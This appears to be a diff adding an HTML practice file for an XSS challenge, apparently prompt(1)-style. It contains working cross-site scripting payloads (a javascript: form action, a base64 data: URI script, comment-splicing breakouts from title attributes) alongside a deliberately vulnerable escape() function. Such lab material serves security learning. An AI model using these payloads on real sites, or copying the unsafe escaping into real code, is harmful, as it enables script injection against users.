@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Document</title>
+  </head>
+  <body>
+    <form action="javascript:prompt(1)" method="post">
+      <input name="action" value="xss" />
+    </form>
+    <svg>prompt(1)</svg>
+    <p>html大写转小写，js可以区分大小写</p>
+    <!-- <img src="./PROMPT.JS"/> -->
+    <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="
+      >test</a
+    >
+    <!-- <SCRIPT/SRC="./PROMPT.JS"></SCRIPT> -->
+    <script>
+      // EVAL('prompt(1)')
+      // PROMPT(1)
+    </script>
+    <script>
+      console.log(document.forms[0].action);
+      //   document.forms[0].submit();
+
+      // prompt
+      // (1)
+    </script>
+
+    
+
+    <script>
+        
+      function escape(input) {
+        // pass in something like dog#cat#bird#mouse...
+        var segments = input.split("#");
+        return segments
+          .map(function(title) {
+            // title can only contain 12 characters
+            return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
+          })
+          .join("\n");
+      }
+    </script>
+
+    <!-- <p class="comment" title="">
+      <script>
+        /*"></p>
+    <p class="comment" title="">*/ prompt(
+          /*"></p>
+    <p class="comment" title="">*/ 1
+        ); /*"></p>
+    <p class="comment" title="">*/
+      </script>
+      ">
+    </p> -->
+
+    <!-- < IMG SRC=# ONERROR="PROMPT(1)">
+
+    
+    < SCRIPT>PROMPT(1)< /SCRIPT> -->
+
+    <p class="comment" title="">
+            <svg>
+              <!--" data-comment='{"id":0}'></p>
+              <p class="comment" title="-->
+              <script>
+                <!--" data-comment='{"id":1}'></p> <p class="comment" title="-->
+                prompt(1)
+                <!---" data-comment='{"id":2}'-->
+              </script>
+            </svg>
+          </p>
+  </body>
+</html>
